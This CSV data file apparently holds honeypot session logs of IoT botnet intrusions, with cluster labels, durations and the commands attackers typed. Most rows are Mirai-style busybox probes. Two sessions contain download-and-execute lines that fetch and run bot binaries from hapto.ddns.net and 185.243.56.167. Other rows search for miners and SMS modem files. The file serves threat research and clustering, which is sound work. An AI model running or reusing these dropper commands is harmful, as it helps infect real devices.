session,SeededKmeans_result,Unnamed: 0,duration,command_freq,input
d8223e6f5bc4,0,28,3.211135625839233,13,rm .s; exit
8d3019ae1a5a,0,29,0.813608407974243,13,enable
8d3019ae1a5a,0,30,0.813608407974243,13,system
8d3019ae1a5a,0,31,0.813608407974243,13,system
8d3019ae1a5a,0,32,0.813608407974243,13,shell
8d3019ae1a5a,0,33,0.813608407974243,13,shell
8d3019ae1a5a,0,34,0.813608407974243,13,sh
8d3019ae1a5a,0,35,0.813608407974243,13,cat /proc/mounts; /bin/busybox RJWCK
8d3019ae1a5a,0,36,0.813608407974243,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RJWCK
8d3019ae1a5a,0,37,0.813608407974243,13,tftp; wget; /bin/busybox RJWCK
8d3019ae1a5a,0,38,0.813608407974243,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
8d3019ae1a5a,0,39,0.813608407974243,13,while read i
8d3019ae1a5a,0,40,0.813608407974243,13,/bin/busybox RJWCK
8d3019ae1a5a,0,41,0.813608407974243,13,rm .s; exit
c67329299b6d,0,42,1.04880404472351,13,enable
c67329299b6d,0,43,1.04880404472351,13,system
c67329299b6d,0,44,1.04880404472351,13,system
c67329299b6d,0,45,1.04880404472351,13,shell
c67329299b6d,0,46,1.04880404472351,13,shell
c67329299b6d,0,47,1.04880404472351,13,sh
c67329299b6d,0,48,1.04880404472351,13,cat /proc/mounts; /bin/busybox UOXTH
c67329299b6d,0,49,1.04880404472351,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UOXTH
c67329299b6d,0,50,1.04880404472351,13,tftp; wget; /bin/busybox UOXTH
c67329299b6d,0,51,1.04880404472351,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
c67329299b6d,0,52,1.04880404472351,13,while read i
c67329299b6d,0,53,1.04880404472351,13,/bin/busybox UOXTH
c67329299b6d,0,54,1.04880404472351,13,rm .s; exit
abac76d64b7f,2,55,12.954164028167725,2,uname -a
abac76d64b7f,2,56,12.954164028167725,2,cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hapto.ddns.net/ssh || curl -o ssh hapto.ddns.net/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane root
ee45c24367eb,3,57,117.75325894355774,9,/ip cloud print
ee45c24367eb,3,58,117.75325894355774,9,/ip cloud print
ee45c24367eb,3,59,117.75325894355774,9,ifconfig
ee45c24367eb,3,60,117.75325894355774,9,uname -a
ee45c24367eb,3,61,117.75325894355774,9,cat /proc/cpuinfo
ee45c24367eb,3,62,117.75325894355774,9,ps | grep '[Mm]iner'
ee45c24367eb,3,63,117.75325894355774,9,ps -ef | grep '[Mm]iner'
ee45c24367eb,3,64,117.75325894355774,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
ee45c24367eb,3,65,117.75325894355774,9,echo Hi | cat -n
a1fcd3e7e5f6,0,66,11.905640602111816,11,enable
a1fcd3e7e5f6,0,67,11.905640602111816,11,system
a1fcd3e7e5f6,0,68,11.905640602111816,11,system
a1fcd3e7e5f6,0,69,11.905640602111816,11,shell
a1fcd3e7e5f6,0,70,11.905640602111816,11,shell
a1fcd3e7e5f6,0,71,11.905640602111816,11,sh
a1fcd3e7e5f6,0,72,11.905640602111816,11,/bin/busybox SATORI
a1fcd3e7e5f6,0,73,11.905640602111816,11,/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo ; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1
a1fcd3e7e5f6,0,74,11.905640602111816,11,cat /bin/busybox
a1fcd3e7e5f6,0,75,11.905640602111816,11,while read i
a1fcd3e7e5f6,0,76,11.905640602111816,11,dd if=/bin/busybox bs=22 count=1
d51e460c7b30,0,77,4.036076784133911,13,enable
d51e460c7b30,0,78,4.036076784133911,13,system
d51e460c7b30,0,79,4.036076784133911,13,system
d51e460c7b30,0,80,4.036076784133911,13,shell
d51e460c7b30,0,81,4.036076784133911,13,shell
d51e460c7b30,0,82,4.036076784133911,13,sh
d51e460c7b30,0,83,4.036076784133911,13,cat /proc/mounts; /bin/busybox UNEIU
d51e460c7b30,0,84,4.036076784133911,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UNEIU
d51e460c7b30,0,85,4.036076784133911,13,tftp; wget; /bin/busybox UNEIU
d51e460c7b30,0,86,4.036076784133911,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d51e460c7b30,0,87,4.036076784133911,13,while read i
d51e460c7b30,0,88,4.036076784133911,13,/bin/busybox UNEIU
d51e460c7b30,0,89,4.036076784133911,13,rm .s; exit
78567d68a8f3,0,90,5.159321069717407,13,enable
78567d68a8f3,0,91,5.159321069717407,13,system
78567d68a8f3,0,92,5.159321069717407,13,system
78567d68a8f3,0,93,5.159321069717407,13,shell
78567d68a8f3,0,94,5.159321069717407,13,shell
78567d68a8f3,0,95,5.159321069717407,13,sh
78567d68a8f3,0,96,5.159321069717407,13,cat /proc/mounts; /bin/busybox XROPL
78567d68a8f3,0,97,5.159321069717407,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XROPL
78567d68a8f3,0,98,5.159321069717407,13,tftp; wget; /bin/busybox XROPL
78567d68a8f3,0,99,5.159321069717407,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
78567d68a8f3,0,100,5.159321069717407,13,while read i
78567d68a8f3,0,101,5.159321069717407,13,/bin/busybox XROPL
78567d68a8f3,0,102,5.159321069717407,13,rm .s; exit
a1708c7efde1,3,103,5.594111204147339,1,nproc; uname -a
a30230328068,0,104,2.943906784057617,13,enable
a30230328068,0,105,2.943906784057617,13,system
a30230328068,0,106,2.943906784057617,13,system
a30230328068,0,107,2.943906784057617,13,shell
a30230328068,0,108,2.943906784057617,13,shell
a30230328068,0,109,2.943906784057617,13,sh
a30230328068,0,110,2.943906784057617,13,cat /proc/mounts; /bin/busybox DYQVX
a30230328068,0,111,2.943906784057617,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox DYQVX
a30230328068,0,112,2.943906784057617,13,tftp; wget; /bin/busybox DYQVX
a30230328068,0,113,2.943906784057617,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
a30230328068,0,114,2.943906784057617,13,while read i
a30230328068,0,115,2.943906784057617,13,/bin/busybox DYQVX
a30230328068,0,116,2.943906784057617,13,rm .s; exit
e77109ef96fd,0,117,2.777678489685058,13,enable
e77109ef96fd,0,118,2.777678489685058,13,system
e77109ef96fd,0,119,2.777678489685058,13,system
e77109ef96fd,0,120,2.777678489685058,13,shell
e77109ef96fd,0,121,2.777678489685058,13,shell
e77109ef96fd,0,122,2.777678489685058,13,sh
e77109ef96fd,0,123,2.777678489685058,13,cat /proc/mounts; /bin/busybox KIHZA
e77109ef96fd,0,124,2.777678489685058,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KIHZA
e77109ef96fd,0,125,2.777678489685058,13,tftp; wget; /bin/busybox KIHZA
e77109ef96fd,0,126,2.777678489685058,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e77109ef96fd,0,127,2.777678489685058,13,while read i
e77109ef96fd,0,128,2.777678489685058,13,/bin/busybox KIHZA
e77109ef96fd,0,129,2.777678489685058,13,rm .s; exit
d3ece9366a18,0,130,9.004159927368164,13,enable
d3ece9366a18,0,131,9.004159927368164,13,system
d3ece9366a18,0,132,9.004159927368164,13,system
d3ece9366a18,0,133,9.004159927368164,13,shell
d3ece9366a18,0,134,9.004159927368164,13,shell
d3ece9366a18,0,135,9.004159927368164,13,sh
d3ece9366a18,0,136,9.004159927368164,13,cat /proc/mounts; /bin/busybox JOKGF
d3ece9366a18,0,137,9.004159927368164,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JOKGF
d3ece9366a18,0,138,9.004159927368164,13,tftp; wget; /bin/busybox JOKGF
d3ece9366a18,0,139,9.004159927368164,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d3ece9366a18,0,140,9.004159927368164,13,while read i
d3ece9366a18,0,141,9.004159927368164,13,/bin/busybox JOKGF
d3ece9366a18,0,142,9.004159927368164,13,rm .s; exit
0540a14cc9ef,0,143,4.336338520050049,13,enable
0540a14cc9ef,0,144,4.336338520050049,13,system
0540a14cc9ef,0,145,4.336338520050049,13,system
0540a14cc9ef,0,146,4.336338520050049,13,shell
0540a14cc9ef,0,147,4.336338520050049,13,shell
0540a14cc9ef,0,148,4.336338520050049,13,sh
0540a14cc9ef,0,149,4.336338520050049,13,cat /proc/mounts; /bin/busybox JKDOP
0540a14cc9ef,0,150,4.336338520050049,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JKDOP
0540a14cc9ef,0,151,4.336338520050049,13,tftp; wget; /bin/busybox JKDOP
0540a14cc9ef,0,152,4.336338520050049,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
0540a14cc9ef,0,153,4.336338520050049,13,while read i
0540a14cc9ef,0,154,4.336338520050049,13,/bin/busybox JKDOP
0540a14cc9ef,0,155,4.336338520050049,13,rm .s; exit
239f93542791,0,156,18.20142102241516,13,enable
239f93542791,0,157,18.20142102241516,13,system
239f93542791,0,158,18.20142102241516,13,system
239f93542791,0,159,18.20142102241516,13,shell
239f93542791,0,160,18.20142102241516,13,shell
239f93542791,0,161,18.20142102241516,13,sh
239f93542791,0,162,18.20142102241516,13,cat /proc/mounts; /bin/busybox IWMTP
239f93542791,0,163,18.20142102241516,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox IWMTP
239f93542791,0,164,18.20142102241516,13,tftp; wget; /bin/busybox IWMTP
239f93542791,0,165,18.20142102241516,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
239f93542791,0,166,18.20142102241516,13,while read i
239f93542791,0,167,18.20142102241516,13,/bin/busybox IWMTP
239f93542791,0,168,18.20142102241516,13,rm .s; exit
c226f05f05d8,3,169,112.84874820709229,9,/ip cloud print
c226f05f05d8,3,170,112.84874820709229,9,/ip cloud print
c226f05f05d8,3,171,112.84874820709229,9,ifconfig
c226f05f05d8,3,172,112.84874820709229,9,uname -a
c226f05f05d8,3,173,112.84874820709229,9,cat /proc/cpuinfo
c226f05f05d8,3,174,112.84874820709229,9,ps | grep '[Mm]iner'
c226f05f05d8,3,175,112.84874820709229,9,ps -ef | grep '[Mm]iner'
c226f05f05d8,3,176,112.84874820709229,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
c226f05f05d8,3,177,112.84874820709229,9,echo Hi | cat -n
1b1db78aec94,0,178,1.274125814437866,13,enable
1b1db78aec94,0,179,1.274125814437866,13,system
1b1db78aec94,0,180,1.274125814437866,13,system
1b1db78aec94,0,181,1.274125814437866,13,shell
1b1db78aec94,0,182,1.274125814437866,13,shell
1b1db78aec94,0,183,1.274125814437866,13,sh
1b1db78aec94,0,184,1.274125814437866,13,cat /proc/mounts; /bin/busybox GMNWA
1b1db78aec94,0,185,1.274125814437866,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GMNWA
1b1db78aec94,0,186,1.274125814437866,13,tftp; wget; /bin/busybox GMNWA
1b1db78aec94,0,187,1.274125814437866,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
1b1db78aec94,0,188,1.274125814437866,13,while read i
1b1db78aec94,0,189,1.274125814437866,13,/bin/busybox GMNWA
1b1db78aec94,0,190,1.274125814437866,13,rm .s; exit
d77ffde64c08,0,191,4.022591114044189,13,enable
d77ffde64c08,0,192,4.022591114044189,13,system
d77ffde64c08,0,193,4.022591114044189,13,system
d77ffde64c08,0,194,4.022591114044189,13,shell
d77ffde64c08,0,195,4.022591114044189,13,shell
d77ffde64c08,0,196,4.022591114044189,13,sh
d77ffde64c08,0,197,4.022591114044189,13,cat /proc/mounts; /bin/busybox PCSHC
d77ffde64c08,0,198,4.022591114044189,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PCSHC
d77ffde64c08,0,199,4.022591114044189,13,tftp; wget; /bin/busybox PCSHC
d77ffde64c08,0,200,4.022591114044189,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
d77ffde64c08,0,201,4.022591114044189,13,while read i
d77ffde64c08,0,202,4.022591114044189,13,/bin/busybox PCSHC
d77ffde64c08,0,203,4.022591114044189,13,rm .s; exit
efef1f4f9c64,0,204,0.8046431541442871,13,enable
efef1f4f9c64,0,205,0.8046431541442871,13,system
efef1f4f9c64,0,206,0.8046431541442871,13,system
efef1f4f9c64,0,207,0.8046431541442871,13,shell
efef1f4f9c64,0,208,0.8046431541442871,13,shell
efef1f4f9c64,0,209,0.8046431541442871,13,sh
efef1f4f9c64,0,210,0.8046431541442871,13,cat /proc/mounts; /bin/busybox WGWWW
efef1f4f9c64,0,211,0.8046431541442871,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox WGWWW
efef1f4f9c64,0,212,0.8046431541442871,13,tftp; wget; /bin/busybox WGWWW
efef1f4f9c64,0,213,0.8046431541442871,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
efef1f4f9c64,0,214,0.8046431541442871,13,while read i
efef1f4f9c64,0,215,0.8046431541442871,13,/bin/busybox WGWWW
efef1f4f9c64,0,216,0.8046431541442871,13,rm .s; exit
9d93ddb044c7,3,217,12.278405904769896,5,sh
9d93ddb044c7,3,218,12.278405904769896,5,shell
9d93ddb044c7,3,219,12.278405904769896,5,shell
9d93ddb044c7,3,220,12.278405904769896,5,help
9d93ddb044c7,3,221,12.278405904769896,5,busybox
f494d2afc575,0,222,1.455475091934204,13,enable
f494d2afc575,0,223,1.455475091934204,13,system
f494d2afc575,0,224,1.455475091934204,13,system
f494d2afc575,0,225,1.455475091934204,13,shell
f494d2afc575,0,226,1.455475091934204,13,shell
f494d2afc575,0,227,1.455475091934204,13,sh
f494d2afc575,0,228,1.455475091934204,13,cat /proc/mounts; /bin/busybox NUXWH
f494d2afc575,0,229,1.455475091934204,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NUXWH
f494d2afc575,0,230,1.455475091934204,13,tftp; wget; /bin/busybox NUXWH
f494d2afc575,0,231,1.455475091934204,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
f494d2afc575,0,232,1.455475091934204,13,while read i
f494d2afc575,0,233,1.455475091934204,13,/bin/busybox NUXWH
f494d2afc575,0,234,1.455475091934204,13,rm .s; exit
e74b9f58c370,0,235,1.079039573669433,13,enable
e74b9f58c370,0,236,1.079039573669433,13,system
e74b9f58c370,0,237,1.079039573669433,13,system
e74b9f58c370,0,238,1.079039573669433,13,shell
e74b9f58c370,0,239,1.079039573669433,13,shell
e74b9f58c370,0,240,1.079039573669433,13,sh
e74b9f58c370,0,241,1.079039573669433,13,cat /proc/mounts; /bin/busybox YCYDS
e74b9f58c370,0,242,1.079039573669433,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YCYDS
e74b9f58c370,0,243,1.079039573669433,13,tftp; wget; /bin/busybox YCYDS
e74b9f58c370,0,244,1.079039573669433,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e74b9f58c370,0,245,1.079039573669433,13,while read i
e74b9f58c370,0,246,1.079039573669433,13,/bin/busybox YCYDS
e74b9f58c370,0,247,1.079039573669433,13,rm .s; exit
701864b90d35,3,248,80.14842939376831,9,/ip cloud print
701864b90d35,3,249,80.14842939376831,9,/ip cloud print
701864b90d35,3,250,80.14842939376831,9,ifconfig
701864b90d35,3,251,80.14842939376831,9,uname -a
701864b90d35,3,252,80.14842939376831,9,cat /proc/cpuinfo
701864b90d35,3,253,80.14842939376831,9,ps | grep '[Mm]iner'
701864b90d35,3,254,80.14842939376831,9,ps -ef | grep '[Mm]iner'
701864b90d35,3,255,80.14842939376831,9,ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
701864b90d35,3,256,80.14842939376831,9,echo Hi | cat -n
3bed27ba4719,0,257,5.75736665725708,13,enable
3bed27ba4719,0,258,5.75736665725708,13,system
3bed27ba4719,0,259,5.75736665725708,13,system
3bed27ba4719,0,260,5.75736665725708,13,shell
3bed27ba4719,0,261,5.75736665725708,13,shell
3bed27ba4719,0,262,5.75736665725708,13,sh
3bed27ba4719,0,263,5.75736665725708,13,cat /proc/mounts; /bin/busybox RGIUA
3bed27ba4719,0,264,5.75736665725708,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RGIUA
3bed27ba4719,0,265,5.75736665725708,13,tftp; wget; /bin/busybox RGIUA
3bed27ba4719,0,266,5.75736665725708,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
3bed27ba4719,0,267,5.75736665725708,13,while read i
3bed27ba4719,0,268,5.75736665725708,13,/bin/busybox RGIUA
3bed27ba4719,0,269,5.75736665725708,13,rm .s; exit
a008676b9e73,0,270,1.092103242874145,13,enable
a008676b9e73,0,271,1.092103242874145,13,system
a008676b9e73,0,272,1.092103242874145,13,system
a008676b9e73,0,273,1.092103242874145,13,shell
a008676b9e73,0,274,1.092103242874145,13,shell
a008676b9e73,0,275,1.092103242874145,13,sh
a008676b9e73,0,276,1.092103242874145,13,cat /proc/mounts; /bin/busybox RITPX
a008676b9e73,0,277,1.092103242874145,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox RITPX
a008676b9e73,0,278,1.092103242874145,13,tftp; wget; /bin/busybox RITPX
a008676b9e73,0,279,1.092103242874145,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
a008676b9e73,0,280,1.092103242874145,13,while read i
a008676b9e73,0,281,1.092103242874145,13,/bin/busybox RITPX
a008676b9e73,0,282,1.092103242874145,13,rm .s; exit
aaff7f4f9a57,0,283,4.84981894493103,13,enable
aaff7f4f9a57,0,284,4.84981894493103,13,system
aaff7f4f9a57,0,285,4.84981894493103,13,system
aaff7f4f9a57,0,286,4.84981894493103,13,shell
aaff7f4f9a57,0,287,4.84981894493103,13,shell
aaff7f4f9a57,0,288,4.84981894493103,13,sh
aaff7f4f9a57,0,289,4.84981894493103,13,cat /proc/mounts; /bin/busybox FJUKH
aaff7f4f9a57,0,290,4.84981894493103,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FJUKH
aaff7f4f9a57,0,291,4.84981894493103,13,tftp; wget; /bin/busybox FJUKH
aaff7f4f9a57,0,292,4.84981894493103,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
aaff7f4f9a57,0,293,4.84981894493103,13,while read i
aaff7f4f9a57,0,294,4.84981894493103,13,/bin/busybox FJUKH
aaff7f4f9a57,0,295,4.84981894493103,13,rm .s; exit
d5672d611002,3,296,2.672670841217041,4,shell
d5672d611002,3,297,2.672670841217041,4,shell
d5672d611002,3,298,2.672670841217041,4,sh
d5672d611002,3,299,2.672670841217041,4,cat /bin/busybox
e5840e902c93,0,300,1.659119844436645,13,enable
e5840e902c93,0,301,1.659119844436645,13,system
e5840e902c93,0,302,1.659119844436645,13,system
e5840e902c93,0,303,1.659119844436645,13,shell
e5840e902c93,0,304,1.659119844436645,13,shell
e5840e902c93,0,305,1.659119844436645,13,sh
e5840e902c93,0,306,1.659119844436645,13,cat /proc/mounts; /bin/busybox QKQVW
e5840e902c93,0,307,1.659119844436645,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QKQVW
e5840e902c93,0,308,1.659119844436645,13,tftp; wget; /bin/busybox QKQVW
e5840e902c93,0,309,1.659119844436645,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
e5840e902c93,0,310,1.659119844436645,13,while read i
e5840e902c93,0,311,1.659119844436645,13,/bin/busybox QKQVW
e5840e902c93,0,312,1.659119844436645,13,rm .s; exit
e8ba1750cf5d,3,313,2.440993070602417,4,shell
e8ba1750cf5d,3,314,2.440993070602417,4,shell
e8ba1750cf5d,3,315,2.440993070602417,4,sh
e8ba1750cf5d,3,316,2.440993070602417,4,cat /bin/busybox
1e57b6232ff2,2,317,21.12516522407532,26,shell
1e57b6232ff2,2,318,21.12516522407532,26,shell
1e57b6232ff2,2,319,21.12516522407532,26,sh
1e57b6232ff2,2,320,21.12516522407532,26,>/tmp/.l && cd /tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,321,21.12516522407532,26,>/run//var/.l && cd /run//var/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,322,21.12516522407532,26,>/dev/.l && cd /dev/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,323,21.12516522407532,26,>/mnt/.l && cd /mnt/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,324,21.12516522407532,26,>/sys/fs/user/.l && cd /sys/fs/user/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,328,21.12516522407532,26,>/usr/.l && cd /usr/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,330,21.12516522407532,26,>/temp/.l && cd /temp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,331,21.12516522407532,26,>/data/local/tmp/.l && cd /data/local/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,332,21.12516522407532,26,>/local/.l && cd /local/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,333,21.12516522407532,26,>/sys/.l && cd /sys/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,334,21.12516522407532,26,>/etc/.l && cd /etc/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,335,21.12516522407532,26,>/media/.l && cd /media/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,336,21.12516522407532,26,>/www/.l && cd /www/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,337,21.12516522407532,26,>/var/tmp/.l && cd /var/tmp/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,338,21.12516522407532,26,>/dev/shm/.l && cd /dev/shm/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,339,21.12516522407532,26,>/dev/netslink/.l && cd /dev/netslink/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,340,21.12516522407532,26,>/boot/.l && cd /boot/; echo -en '\x50\x41\x54\x48\x5f\x44\x4f\x4e\x45' || /bin/busybox DADDYL33T 
1e57b6232ff2,2,341,21.12516522407532,26,/bin/busybox wget || wget; /bin/busybox tftp || tftp; /bin/busybox ftpget || ftpget; echo -en '\x45\x43\x48\x4f\x5f\x44\x4f\x4e\x45'
1e57b6232ff2,2,342,21.12516522407532,26,wget
1e57b6232ff2,2,343,21.12516522407532,26,tftp
1e57b6232ff2,2,344,21.12516522407532,26,ftpget
1e57b6232ff2,2,345,21.12516522407532,26,/bin/busybox wget http://185.243.56.167/bot_ia_64_el -O- > .f; chmod 777 .f || (cp /proc/self/exe .m && > .m && cat .f > .m && (rm -rf .f || rm .f) && cp .m .f && (rm -rf .m || rm .f)); ./.f wget.ia_64; (rm -rf .f || rm .f); (rm -rf .m || rm .m)
1e57b6232ff2,2,346,21.12516522407532,26,wget http://185.243.56.167/bot_ia_64_el -O-
5817f66fd82a,3,325,2.436866998672485,4,shell
5817f66fd82a,3,326,2.436866998672485,4,shell
5817f66fd82a,3,327,2.436866998672485,4,sh
5817f66fd82a,3,329,2.436866998672485,4,cat /bin/busybox
ed40208d2bbc,3,347,2.408712387084961,4,shell
ed40208d2bbc,3,348,2.408712387084961,4,shell
ed40208d2bbc,3,349,2.408712387084961,4,sh
ed40208d2bbc,3,350,2.408712387084961,4,cat /bin/busybox
ce2d6c9a590a,2,351,21.06158757209778,26,shell
ce2d6c9a590a,2,352,21.06158757209778,26,shell
ce2d6c9a590a,2,353,21.06158757209778,26,sh
